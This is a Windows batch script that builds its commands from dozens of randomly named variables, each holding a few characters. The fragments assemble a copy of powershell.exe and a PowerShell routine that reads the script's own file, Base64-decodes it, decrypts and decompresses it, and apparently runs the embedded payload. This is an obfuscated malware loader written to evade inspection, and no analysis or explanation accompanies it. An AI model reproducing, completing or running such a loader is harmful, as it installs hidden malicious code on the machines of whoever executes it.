@echo off
set "TINEaWuuEk=Po"
set "UxiehnQWPS=xe"
set "fpwkFdWDPZ=rs"
set "aCgfdKmFRZ=ws"
set "BqwuoiVhdJ=0\"
set "bEjKjBeADp=co"
set "EFtwTxFpRg=em"
set "nIOtFQbYeh=po"
set "aNTFbKwaPI=1."
set "XjKxoVxLCG=nd"
set "oKEloDpXUF=ow"
set "gbNEJvEUlX=in"
set "fGhRLTCocP=Wi"
set "RDGalKPwOi=we"
set "RXXXlDVHAZ=rS"
set "LiSVeIXQDL=py"
set "usYeiVLQtx=\v"
set "aiTUbyMxmi=:\"
set "JxVIQXKvjE=ll"
set "aYrfuRyvFf=Sy"
set "abVGUucWCi=st"
set "xIbPTBpmTh=ll"
set "fUsOFUEXBm=\W"
set "tztUEXmDNB=.e"
set "OfhyhDmtVs= C"
set "XhYoFptzQx=32"
set "KznTlWqUGM=we"
set "WzDvGiYpMn=s\"
set "tAtlGAkSem=y "
set "liEyiSdGaE=do"
set "aDNJksYAZl=he"
set "iZdmdDuZxl=he"
set "MowCzHtOuH= /"
set "WcDBBeEgEb=cd"
set "jrFDzaCVjJ= %~dp0"
set "uCYBhOaKdQ=ionM"
set "pHJrQTErhZ=; };"
set "oDiCHSRBDU=oryS"
set "JRzSatPqDG=rofi"
set "lDsbYoenBM=[Sys"
set "dpstCpEPuR=tS46"
set "oPRneXyOfI= = $"
set "tvfJLCqWqI=6] -"
set "rzWcDaGXzi=g.Su"
set "WxbAKueoAM=$cWi"
set "HDgSkmamBt=saBm"
set "hwGfXNRRPD=x = "
set "gTAoDogzKd= New"
set "bzDOdeebFn=wJ);"
set "vncMIGDFNe=ptog"
set "OgpuzirfMQ=yste"
set "nQRrAQdjBK=ring"
set "FMmJpgrCCh=..-1"
set "FcafXQUbNq=wJ ="
set "OIDKzDVysq=cukg"
set "uVFwXjmPuF=lit("
set "nOyLuQUJNV=ew-O"
set "QEyMDlluXc=Comp"
set "bTzTbVmPBy=m(, "
set "KNHdsMgDEh=Star"
set "mnJNBibRyW=k.Pa"
set "gygwdDntae=y]::"
set "cXHeFCwFei=('%~f0'"
set "GsDdYgslgw=ment"
set "DCwpquwXFP=QYg "
set "ohfcwdlQEh=stem"
set "yUbLxgPwKQ=le  "
set "CztkDqZSej=);$V"
set "CIaGgKNEWo=);$j"
set "CNbcVCsUEO=BC;$"
set "KlusvsYHHM=stem"
set "UlMEBsOjsm=fmnV"
set "DGqpLvhkRu=();$"
set "gnMiSfqNxg=.Dis"
set "mUcpdneNUF=trea"
set "sVZzDxOUdH=gnir"
set "EGSOIVeEqu=.Com"
set "iNhlPrJcUn=pher"
set "RMDlmEQrpF=;$Yx"
set "oCUhXQhHnK=)) {"
set "ISKAaZNIbs=ect "
set "kJVvohtjjE=V = "
set "GiHzozCTjj=oin "
set "tLMFfjApym=Bmor"
set "eCGdvxhJob=ptog"
set "VdQBVTdYFj=ct S"
set "mjPZztAjlh=daeR"
set "DfvtIVMnFs=RoWk"
set "UUnDdAXxww=New-"
set "mISsQNTlNZ=L4Yi"
set "ybBZbhABil=;$ax"
set "pGlzxuGdTE=]::N"
set "gZhtfjrrco=k; }"
